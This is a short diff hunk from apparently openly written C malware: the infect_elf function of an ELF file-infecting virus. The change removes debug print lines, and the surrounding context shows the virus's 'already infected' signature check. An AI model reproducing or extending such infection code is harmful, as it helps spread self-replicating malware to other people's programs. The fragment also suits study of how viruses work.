@@ -391,9 +391,6 @@ int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
                 return 0;
             }
             // compare the signatures
-            write(1, STR("Segment num : \\n"), strlen("Programme signature\\n"));
-            write_int(phdr.p_offset, STR("\\n"), xtoa);
-
             if (!strcmp(virus_signature, program_signature))
             { // the signatures are the same, the file is already infected
                 write(1, STR("Signatures similar, file already infected\\n"), strlen("Signatures similar, file already infected\\n"));
